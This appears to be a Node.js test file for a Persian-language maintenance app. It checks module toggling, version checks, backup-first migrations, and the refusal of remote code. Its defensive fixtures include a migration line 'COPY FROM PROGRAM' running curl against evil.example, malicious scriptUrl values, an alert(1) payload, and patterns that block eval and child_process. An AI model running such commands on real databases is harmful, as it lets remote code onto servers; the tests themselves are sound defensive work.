'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const express = require('express');
const { Script, createContext } = require('node:vm');
const release = require('../server/release-info');
const catalog = require('../server/module-catalog');
const { createModuleService } = require('../server/module-service');
const { createModuleRouter, createModuleGate } = require('../server/module-routes');
const { resolveRuntimeConfig } = require('../server/runtime-config');
const updates = require('../server/update-service');

const root = path.join(__dirname, '..');
const read = file => fs.readFileSync(path.join(root, file), 'utf8');
const pkg = require('../package.json');

function registryPool(seed = []) {
  const db = {
    modules: seed.map(row => ({ ...row })),
    audit: [],
    outbox: [],
    users: [{ id: 'u-admin' }, { id: 'u-tech' }]
  };
  let snapshot = null;
  async function query(sql, params = []) {
    const text = String(sql).replace(/\s+/g, ' ').trim();
    if (text === 'BEGIN') { snapshot = JSON.parse(JSON.stringify(db)); return { rows: [] }; }
    if (text === 'COMMIT') { snapshot = null; return { rows: [] }; }
    if (text === 'ROLLBACK') {
      if (snapshot) {
        db.modules = snapshot.modules;
        db.audit = snapshot.audit;
        db.outbox = snapshot.outbox;
      }
      snapshot = null;
      return { rows: [] };
    }
    if (text.startsWith('SELECT id, enabled, row_version, updated_at FROM app_modules')) {
      return { rows: db.modules.map(row => ({ ...row })) };
    }
    if (text.startsWith('SELECT id, enabled, row_version FROM app_modules WHERE id=$1')) {
      return { rows: db.modules.filter(row => row.id === params[0]).map(row => ({ ...row })) };
    }
    if (text.startsWith('UPDATE app_modules SET enabled=$2')) {
      const row = db.modules.find(item => item.id === params[0] && Number(item.row_version) === Number(params[3]));
      if (!row) return { rows: [] };
      row.enabled = params[1];
      row.updated_by = params[2];
      row.row_version = Number(row.row_version) + 1;
      return { rows: [{ id: row.id, enabled: row.enabled, row_version: row.row_version }] };
    }
    if (text.startsWith('INSERT INTO app_modules')) {
      const row = { id: params[0], enabled: params[1], row_version: 2, updated_by: params[2] };
      db.modules.push(row);
      return { rows: [{ id: row.id, enabled: row.enabled, row_version: 2 }] };
    }
    if (text.startsWith('INSERT INTO audit_x')) { db.audit.push(params); return { rows: [] }; }
    if (text.startsWith('SELECT id FROM users WHERE active=true')) return { rows: db.users.map(row => ({ ...row })) };
    if (text.startsWith('INSERT INTO event_outbox')) { db.outbox.push(params); return { rows: [] }; }
    const error = new Error('unparsed: ' + text);
    error.code = 'UNPARSED';
    throw error;
  }
  return { db, query, connect: async () => ({ query, release() {} }) };
}

function scriptPool(options = {}) {
  const applied = options.applied || [];
  const calls = [];
  const audit = [];
  async function query(sql, params = []) {
    const text = String(sql).replace(/\s+/g, ' ').trim();
    calls.push(text);
    if (text.startsWith('CREATE TABLE')) return { rows: [] };
    if (text.includes("to_regclass('public.audit_x')")) {
      return { rows: [{ audit_x: options.auditMissing ? null : 'audit_x', restore_points: options.restoreMissing ? null : 'system_restore_points' }] };
    }
    if (text.startsWith('INSERT INTO system_restore_points')) return { rows: [] };
    if (text.startsWith('SELECT checksum FROM schema_migrations')) {
      const row = applied.find(item => item.version === params[0]);
      return { rows: row ? [{ checksum: row.checksum }] : [] };
    }
    if (text.startsWith('INSERT INTO schema_migrations')) {
      applied.push({ version: params[0], checksum: params[2] });
      return { rows: [] };
    }
    if (text.startsWith('INSERT INTO audit_x')) {
      audit.push({ action: params[4], entity: params[5], note: params[6] });
      return { rows: [] };
    }
    if (text === 'ROLLBACK') return { rows: [] };
    if (options.failOn && text.includes(options.failOn)) {
      const error = new Error('sql failed');
      error.code = '42601';
      throw error;
    }
    return { rows: [] };
  }
  return { query, calls, audit, applied };
}

function tempFile(bytes = 64) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bfg-stage5-'));
  const file = path.join(dir, 'backup.dump');
  fs.writeFileSync(file, Buffer.alloc(bytes, 7));
  return { dir, file };
}

function migrationDir(name, sql) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'bfg-mig-'));
  fs.writeFileSync(path.join(dir, name), sql);
  return dir;
}

const admin = { id: 'u-admin', name: 'مدیر', username: 'admin', role: 'admin' };
const seeded = () => catalog.modules().map(module => ({ id: module.id, enabled: true, row_version: 1 }));

test('signed catalog registers the five operational modules and no remote code', () => {
  const ids = catalog.modules().map(module => module.id);
  assert.deepEqual(ids, ['equipment', 'requests', 'work_orders', 'pm', 'inventory']);
  for (const module of catalog.modules()) {
    assert.equal(typeof module.name, 'string');
    assert.ok(module.name.length > 1);
    assert.match(module.version, /^\d+\.\d+\.\d+$/);
    assert.equal(module.enabled, true);
    assert.ok(module.permissions.length);
    assert.equal(module.minBackendVersion, pkg.version);
    assert.equal(module.minClientVersion, pkg.version);
    assert.ok(module.menuIds.length);
    assert.equal(module.scriptUrl, undefined);
    assert.equal(module.code, undefined);
    assert.equal(module.src, undefined);
  }
  assert.deepEqual(catalog.get('equipment').menuIds, ['equipment']);
  assert.deepEqual(catalog.get('inventory').menuIds, ['inv', 'costs']);
});

test('backend announces app and API versions and rejects an older or missing client', () => {
  const config = resolveRuntimeConfig({ NODE_ENV: 'production' });
  assert.equal(config.appVersion, pkg.version);
  assert.equal(config.apiVersion, release.API_VERSION);
  assert.equal(config.minClientVersion, pkg.version);
  assert.equal(config.executionMode, 'server-only');
  assert.equal(release.compareSemver('4.0.0', '4.0.0'), 0);
  assert.equal(release.compareSemver('4.1.0', '4.0.0'), 1);
  assert.equal(release.compareSemver('3.9.0', '4.0.0'), -1);
  assert.equal(release.compareSemver('4.0', '4.0.0'), 0);
  assert.equal(release.compareSemver('beta', '4.0.0'), null);
  assert.equal(release.assessCompatibility('').compatible, false);
  assert.equal(release.assessCompatibility('3.0.0').reason, 'CLIENT_UPDATE_REQUIRED');
  assert.equal(release.assessCompatibility(pkg.version).compatible, true);
  assert.equal(release.assessCompatibility('99.0.0').compatible, true);
  const source = read('server.js');
  assert.match(source, /resolveRuntimeConfig\(process\.env\)/);
  assert.match(source, /assessCompatibility\(req\.get\('x-client-version'\) \|\| ''\)/);
});

test('disabled module routes are identified without matching auth or the registry itself', () => {
  assert.deepEqual(catalog.modulesForPath('/api/equipment?limit=200'), ['equipment']);
  assert.deepEqual(catalog.modulesForPath('/api/requests/req-1'), ['requests']);
  assert.deepEqual(catalog.modulesForPath('/api/work-orders'), ['work_orders']);
  assert.deepEqual(catalog.modulesForPath('/api/pm-plans/pm-1'), ['pm']);
  assert.deepEqual(catalog.modulesForPath('/api/items/item-1'), ['inventory']);
  assert.deepEqual(catalog.modulesForPath('/api/data/assets'), ['equipment']);
  assert.deepEqual(catalog.modulesForPath('/api/work-orders/wo-1/costs').sort(), ['inventory', 'work_orders']);
  assert.deepEqual(catalog.modulesForPath('/api/pm-plans/pm-1/generate-work-order').sort(), ['pm', 'work_orders']);
  assert.deepEqual(catalog.modulesForPath('/api/auth/me'), []);
  assert.deepEqual(catalog.modulesForPath('/api/modules'), []);
  assert.deepEqual(catalog.modulesForPath('/api/modules/equipment'), []);
  assert.deepEqual(catalog.modulesForPath('/api/equipment/../requests'), []);
  assert.deepEqual(catalog.modulesForRequest({
    originalUrl: '/api/equipment/../requests',
    baseUrl: '/api',
    path: '/requests'
  }), ['requests']);
});

test('menu projection hides a disabled module and drops its empty group', () => {
  const menu = [
    { g: 'عملیات' },
    { id: 'dash' },
    { id: 'requests' },
    { g: 'دارایی‌ها' },
    { id: 'tree' },
    { id: 'inv' },
    { g: 'سایر' },
    { id: 'tools' }
  ];
  const states = catalog.modules().map(module => ({ ...module, enabled: module.id === 'requests' }));
  const visible = catalog.visibleMenu(menu, states);
  assert.equal(visible.some(item => item.id === 'requests'), true);
  assert.equal(visible.some(item => item.id === 'tree'), false);
  assert.equal(visible.some(item => item.id === 'inv'), false);
  assert.equal(visible.some(item => item.g === 'دارایی‌ها'), false);
  assert.equal(visible.some(item => item.id === 'tools'), true);
  const closed = catalog.visibleMenu(menu, null, { failClosed: true });
  assert.equal(closed.some(item => item.id === 'tree'), false);
  assert.equal(closed.some(item => item.id === 'dash'), true);
  assert.equal(catalog.visibleMenu(menu, null).some(item => item.id === 'tree'), false);
});

test('only the system administrator can enable or disable a signed module', async () => {
  const pool = registryPool(seeded());
  const service = createModuleService({ cacheMs: 0 });
  const manager = { id: 'u-tech', name: 'سرپرست', username: 'mgr', role: 'mgr', permissions: ['*'] };
  await assert.rejects(
    () => service.setEnabled(pool, manager, 'inventory', { enabled: false, rowVersion: 1 }),
    error => error.code === 'MODULE_ADMIN_REQUIRED'
  );
  assert.equal(pool.db.modules.find(row => row.id === 'inventory').enabled, true);
  await assert.rejects(
    () => service.setEnabled(pool, admin, 'billing', { enabled: true, rowVersion: 1 }),
    error => error.code === 'MODULE_NOT_IN_RELEASE'
  );
  await assert.rejects(
    () => service.setEnabled(pool, admin, 'equipment', { enabled: false, rowVersion: 1, scriptUrl: 'https://evil.example/mod.js' }),
    error => error.code === 'REMOTE_MODULE_REJECTED'
  );
  await assert.rejects(
    () => service.setEnabled(pool, admin, 'equipment', { enabled: false, rowVersion: 4 }),
    error => error.code === 'VERSION_CONFLICT'
  );
  assert.equal(pool.db.audit.length, 0);
  const updated = await service.setEnabled(pool, admin, 'equipment', { enabled: false, rowVersion: 1 });
  assert.equal(updated.enabled, false);
  assert.equal(updated.rowVersion, 2);
  assert.equal(updated.scriptUrl, undefined);
  assert.equal(updated.name, 'تجهیزات');
  assert.equal(await service.isEnabled(pool, 'equipment'), false);
  assert.equal(await service.isEnabled(pool, 'requests'), true);
  assert.equal(pool.db.audit.length, 1);
  assert.equal(pool.db.audit[0][4], 'equipment');
  assert.match(pool.db.audit[0][5], /غیرفعال/);
  assert.equal(pool.db.outbox.length, 1);
  assert.match(pool.db.outbox[0][3], /"enabled":false/);
  assert.match(pool.db.outbox[0][4], /u-admin/);
  assert.match(pool.db.outbox[0][4], /u-tech/);
  assert.throws(() => service.publish(), error => error.code === 'MODULE_PUBLISH_REQUIRES_SIGNED_RELEASE');
});

test('missing registry table stays enabled for reads and refuses a toggle', async () => {
  const missing = async () => { const error = new Error('missing'); error.code = '42P01'; throw error; };
  const pool = { query: missing, connect: async () => ({ query: missing, release() {} }) };
  const service = createModuleService({ cacheMs: 0 });
  const listed = await service.list(pool);
  assert.equal(listed.length, 5);
  assert.equal(listed.every(module => module.enabled), true);
  await assert.rejects(
    () => service.setEnabled(pool, admin, 'pm', { enabled: false, rowVersion: 1 }),
    error => error.code === 'MODULE_REGISTRY_UNAVAILABLE'
  );
});

test('API hides a disabled module and refuses to publish one', async () => {
  const pool = registryPool(seeded());
  const service = createModuleService({ cacheMs: 0 });
  const sessions = {
    async authenticate(req) {
      const role = req.get('x-test-role');
      if (!role) {
        const error = new Error('AUTHENTICATION_REQUIRED');
        error.status = 401;
        error.code = 'AUTHENTICATION_REQUIRED';
        throw error;
      }
      return { id: 'u-' + role, name: role, username: role, role, permissions: ['*'] };
    }
  };
  const app = express();
  app.use(express.json());
  app.use('/api/modules', createModuleRouter({ pool, sessions, service }));
  app.use('/api', createModuleGate({ pool, sessions, service }));
  app.use('/api', (req, res) => res.json({ allowed: true, path: req.path }));
  const server = await new Promise(resolve => {
    const listening = app.listen(0, '127.0.0.1', () => resolve(listening));
  });
  try {
    const base = `http://127.0.0.1:${server.address().port}`;
    const call = async (urlPath, options = {}) => {
      const response = await fetch(base + urlPath, {
        ...options,
        headers: { 'content-type': 'application/json', 'x-test-role': 'admin', ...(options.headers || {}) }
      });
      return { status: response.status, body: await response.json() };
    };
    const listed = await call('/api/modules');
    assert.equal(listed.status, 200);
    assert.equal(listed.body.data.length, 5);
    assert.equal(listed.body.appVersion, pkg.version);
    assert.equal(listed.body.apiVersion, release.API_VERSION);
    const blocked = await call('/api/equipment?limit=200');
    assert.equal(blocked.body.allowed, true);
    const toggled = await call('/api/modules/equipment', { method: 'PATCH', body: JSON.stringify({ enabled: false, rowVersion: 1 }) });
    assert.equal(toggled.status, 200);
    assert.equal(toggled.body.data.enabled, false);
    const hidden = await call('/api/equipment?limit=200');
    assert.equal(hidden.status, 403);
    assert.equal(hidden.body.error, 'MODULE_DISABLED');
    assert.equal(hidden.body.module, 'equipment');
    const requests = await call('/api/requests');
    assert.equal(requests.status, 200);
    const stranger = await call('/api/modules/inventory', {
      method: 'PATCH',
      headers: { 'x-test-role': 'mgr' },
      body: JSON.stringify({ enabled: false, rowVersion: 1 })
    });
    assert.equal(stranger.status, 403);
    assert.equal(stranger.body.error, 'MODULE_ADMIN_REQUIRED');
    const published = await call('/api/modules', { method: 'POST', body: JSON.stringify({ id: 'billing', scriptUrl: 'https://evil.example/a.js' }) });
    assert.equal(published.status, 405);
    assert.equal(published.body.error, 'MODULE_PUBLISH_REQUIRES_SIGNED_RELEASE');
    const unknown = await call('/api/modules/billing', { method: 'PATCH', body: JSON.stringify({ enabled: true, rowVersion: 1 }) });
    assert.equal(unknown.status, 404);
    const anonymous = await fetch(base + '/api/work-orders');
    assert.equal(anonymous.status, 401);
    const costs = await call('/api/work-orders/wo-1/costs');
    assert.equal(costs.body.allowed, true);
    const inventory = await call('/api/modules/inventory', { method: 'PATCH', body: JSON.stringify({ enabled: false, rowVersion: 1 }) });
    assert.equal(inventory.status, 200);
    const costBlocked = await call('/api/work-orders/wo-1/costs');
    assert.equal(costBlocked.status, 403);
    assert.equal(costBlocked.body.module, 'inventory');
  } finally {
    await new Promise(resolve => server.close(resolve));
  }
});

test('an update verifies a local backup before any migration and records the result', async () => {
  const backup = tempFile();
  const empty = { async query() { throw new Error('should not query'); } };
  await assert.rejects(
    () => updates.applyPending({ pool: empty, migrationsDir: root, backupPath: '', user: admin }),
    error => error.code === 'BACKUP_REQUIRED'
  );
  assert.throws(() => updates.assertBackup('https://example.invalid/dump.sql'), error => error.code === 'BACKUP_MUST_BE_LOCAL_FILE');
  assert.throws(() => updates.assertBackup(tempFile(4).file), error => error.code === 'BACKUP_INVALID');
  const stale = tempFile();
  assert.throws(
    () => updates.assertBackup(stale.file, { now: fs.statSync(stale.file).mtimeMs + updates.BACKUP_MAX_AGE_MS + 10 }),
    error => error.code === 'BACKUP_STALE'
  );
  const checked = updates.assertBackup(backup.file);
  assert.equal(checked.bytes, 64);
  assert.match(checked.checksum, /^[a-f0-9]{64}$/);

  const unavailable = scriptPool({ auditMissing: true });
  const dir = migrationDir('010_sample.sql', 'SELECT 42 AS stage5_marker;\n');
  await assert.rejects(
    () => updates.applyPending({ pool: unavailable, migrationsDir: dir, backupPath: backup.file, user: admin }),
    error => error.code === 'AUDIT_UNAVAILABLE'
  );
  assert.equal(unavailable.calls.some(sql => sql.includes('stage5_marker')), false);

  const first = scriptPool();
  const applied = await updates.applyPending({ pool: first, migrationsDir: dir, backupPath: backup.file, user: admin });
  assert.deepEqual(applied.applied, ['010']);
  assert.equal(first.calls.filter(sql => sql.includes('stage5_marker')).length, 1);
  assert.equal(first.audit.some(row => row.action === 'update_started'), true);
  assert.equal(first.audit.some(row => row.action === 'migration_applied' && row.entity === '010'), true);
  assert.equal(first.audit.some(row => row.action === 'update_finished'), true);
  assert.equal(first.calls.some(sql => sql.startsWith('INSERT INTO system_restore_points')), true);

  const second = await updates.applyPending({ pool: first, migrationsDir: dir, backupPath: backup.file, user: admin });
  assert.deepEqual(second.applied, []);
  assert.deepEqual(second.skipped, ['010']);
  assert.equal(first.calls.filter(sql => sql.includes('stage5_marker')).length, 1);
  assert.equal(first.audit.some(row => row.action === 'migration_skipped'), true);

  const mismatch = scriptPool({ applied: [{ version: '010', checksum: 'different' }] });
  await assert.rejects(
    () => updates.applyPending({ pool: mismatch, migrationsDir: dir, backupPath: backup.file, user: admin }),
    error => error.code === 'MIGRATION_CHECKSUM_MISMATCH'
  );
  assert.equal(mismatch.calls.some(sql => sql.includes('stage5_marker')), false);
  assert.equal(mismatch.audit.some(row => row.action === 'migration_failed'), true);

  const remoteDir = migrationDir('010_remote.sql', "COPY FROM PROGRAM 'curl https://evil.example/module.js';\n");
  const remote = scriptPool();
  await assert.rejects(
    () => updates.applyPending({ pool: remote, migrationsDir: remoteDir, backupPath: backup.file, user: admin }),
    error => error.code === 'REMOTE_CODE_REJECTED'
  );
  assert.equal(remote.calls.some(sql => sql.includes('COPY FROM PROGRAM')), false);

  const invalidDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bfg-bad-mig-'));
  fs.writeFileSync(path.join(invalidDir, 'not-numbered.sql'), 'SELECT 1;\n');
  await assert.rejects(
    () => updates.applyPending({ pool: scriptPool(), migrationsDir: invalidDir, backupPath: backup.file, user: admin }),
    error => error.code === 'MIGRATION_NAME_INVALID'
  );
});

test('numbered migrations are idempotent and the fresh schema includes the registry', () => {
  const files = updates.listMigrationFiles(path.join(root, 'migrations'));
  assert.deepEqual(files.map(file => file.version), ['002', '003', '004', '005', '006', '007', '008', '009', '010', '011', '012', '013']);
  for (const file of files) {
    assert.match(file.filename, /^\d{3}_[a-z0-9_]+\.sql$/);
    assert.equal(updates.hasRemoteReference(file.sql), false);
  }
  const sql = read('migrations/009_module_registry.sql');
  assert.match(sql, /CREATE TABLE IF NOT EXISTS app_modules/);
  assert.match(sql, /CREATE TABLE IF NOT EXISTS schema_migrations/);
  assert.match(sql, /ON CONFLICT \(id\) DO NOTHING/);
  assert.doesNotMatch(sql, /\b(DROP|TRUNCATE|DELETE)\b/i);
  assert.match(read('schema.sql'), /CREATE TABLE IF NOT EXISTS app_modules/);
  assert.match(read('schema.sql'), /CREATE TABLE IF NOT EXISTS schema_migrations/);
});

test('client registers local modules, hides disabled menus, and does not load remote code', async () => {
  const created = [];
  const elements = {};
  function make(tag) {
    created.push(tag);
    const node = {
      tag,
      id: '',
      style: {},
      className: '',
      textContent: '',
      children: [],
      setAttribute(name, value) { if (name === 'id') { node.id = value; elements[value] = node; } },
      appendChild(child) { node.children.push(child); if (child.id) elements[child.id] = child; return child; },
      append(...nodes) { nodes.forEach(child => node.appendChild(child)); },
      replaceChildren(...nodes) { node.children = []; nodes.forEach(child => node.appendChild(child)); },
      addEventListener() {}
    };
    return node;
  }
  const body = make('body');
  elements.loginPage = make('div');
  elements.app = make('div');
  elements.content = make('div');
  const document = { body, getElementById(id) { return elements[id] || null; }, createElement: make };
  const location = { reload() {} };
  const window = { document, location, addEventListener() {}, scrollTo() {} };
  window.window = window;
  const context = createContext({ window, document, location, console, confirm() { return false; } });
  new Script(read('public/platform-v2/module-registry.js'), { filename: 'module-registry.js' }).runInContext(context);
  assert.equal(window.BFG_CLIENT_VERSION, pkg.version);
  assert.equal(window.BFGModules.compareSemver('4.0.0', '4.0.0'), release.compareSemver('4.0.0', '4.0.0'));
  assert.equal(window.BFGModules.compareSemver('3.1.0', '4.0.0'), -1);
  assert.equal(window.BFGModules.requiresUpdate(null), true);
  assert.equal(window.BFGModules.requiresUpdate({ compatibility: { compatible: false } }), true);
  assert.equal(window.BFGModules.requiresUpdate({ compatibility: { compatible: true }, minClientVersion: '9.0.0' }), true);
  assert.equal(window.BFGModules.requiresUpdate({ compatibility: { compatible: true }, minClientVersion: pkg.version }), false);
  assert.throws(() => window.BFGModules.register({ id: 'extra', scriptUrl: 'https://evil.example/mod.js' }), /REMOTE_MODULE_REJECTED/);
  assert.throws(() => window.BFGModules.register({ id: 'extra', code: 'alert(1)' }), /REMOTE_MODULE_REJECTED/);
  assert.equal(window.BFGModules.register({ id: 'permits', menuIds: ['ptw'], render() { return 'local'; } }).registered, true);
  window.BFGRuntime = { isServerOnly() { return true; } };
  const menu = [{ g: 'دارایی‌ها' }, { id: 'tree' }, { id: 'dash' }, { id: 'ptw' }];
  assert.equal(window.BFGModules.visibleMenu(menu).some(item => item.id === 'tree'), false);
  assert.equal(window.BFGModules.allows('tree'), false);
  window.ME = { role: 'admin' };
  window.bfgApi = async () => ({
    appVersion: pkg.version,
    apiVersion: release.API_VERSION,
    minClientVersion: pkg.version,
    data: catalog.modules().map(module => ({ ...module, enabled: module.id !== 'equipment' && module.id !== 'inventory', rowVersion: 1 }))
  });
  await window.BFGModules.refresh();
  const visible = window.BFGModules.visibleMenu([{ g: 'عملیات' }, { id: 'requests' }, { id: 'tree' }, { id: 'inv' }, { id: 'profile' }]);
  assert.equal(visible.some(item => item.id === 'requests'), true);
  assert.equal(visible.some(item => item.id === 'tree'), false);
  assert.equal(visible.some(item => item.id === 'inv'), false);
  assert.equal(visible.some(item => item.id === 'modules'), true);
  window.BFGModules.showUpdatePage({ appVersion: '4.0.0', apiVersion: '5.0.0', minClientVersion: '4.1.0', compatibility: { compatible: false } });
  assert.equal(elements.loginPage.style.display, 'none');
  assert.equal(elements.app.style.display, 'none');
  assert.equal(created.includes('script'), false);
  const text = JSON.stringify(elements['bfg-update-required']);
  assert.match(text, /امضا/);
  assert.doesNotMatch(text, /https?:\/\//);
});

test('shell, update runner and package do not fetch modules or add a desktop shell', () => {
  const html = read('public/index.html');
  const client = read('public/platform-v2/backend-client.js');
  const registry = read('public/platform-v2/module-registry.js');
  const runner = read('scripts/apply-update.js');
  const service = read('server/update-service.js');
  const server = read('server.js');
  assert.ok(html.indexOf('/platform-v2/module-registry.js') < html.indexOf('/platform-v2/backend-client.js'));
  assert.match(html, /bfgMenuItems\(\)/);
  assert.match(html, /BFGModules\.allows/);
  assert.match(html, /id:'equipment',ic:'⚙️',t:'فهرست جامع تجهیزات'/);
  assert.doesNotMatch(html, /id:'tree',ic:'⚙️',t:'فهرست جامع تجهیزات'/);
  assert.match(client, /fetch\('\/api\/runtime-config'/);
  assert.match(client, /x-client-version/);
  assert.match(client, /requiresUpdate/);
  assert.match(client, /showUpdatePage/);
  assert.ok(client.indexOf('BFGModules.refresh') < client.indexOf("go('dash')"));
  assert.match(registry, /id:'equipment', menuIds:\['equipment'\]/);
  assert.match(registry, /id:'requests', menuIds:\['requests'\]/);
  assert.match(registry, /id:'work_orders', menuIds:\['wos'\]/);
  assert.match(registry, /id:'pm', menuIds:\['pm'\]/);
  assert.match(registry, /id:'inventory', menuIds:\['inv', 'costs'\]/);
  assert.match(registry, /CLIENT_VERSION = '4\.0\.0'/);
  assert.doesNotMatch(registry, /eval\s*\(|new\s+Function|importScripts|https?:\/\//);
  assert.doesNotMatch(service, /require\(['"]https['"]\)|require\(['"]http['"]\)|child_process|\bexec\(/);
  assert.doesNotMatch(runner, /https?:\/\/|eval\s*\(|fetch\(/);
  assert.ok(runner.indexOf('assertBackup(backupPath)') < runner.indexOf('new Pool'));
  assert.match(server, /app\.use\('\/api', sessions\.mutationGuard\(\)\);[\s\S]*app\.use\('\/api\/modules', createModuleRouter/);
  assert.match(server, /app\.use\('\/api\/modules', createModuleRouter[\s\S]*createModuleGate/);
  assert.match(read('public/platform-v2/maintenance-client.js'), /optionalModule\('\/api\/requests'\)/);
  assert.match(read('public/equipment-v2/equipment-v2.js'), /equipmentModuleAllowed/);
  assert.match(read('docs/UPDATE-AND-ROLLBACK.md'), /pg_restore/);
  assert.match(read('docs/UPDATE-AND-ROLLBACK.md'), /امضاشده/);
  assert.match(read('docs/UPDATE-AND-ROLLBACK.md'), /BACKUP_PATH/);
  const names = Object.keys({ ...pkg.dependencies, ...(pkg.devDependencies || {}) });
  assert.equal(names.includes('electron'), false);
  assert.equal(names.includes('@capacitor/core'), false);
  assert.equal(typeof pkg.scripts['update:apply'], 'string');
});
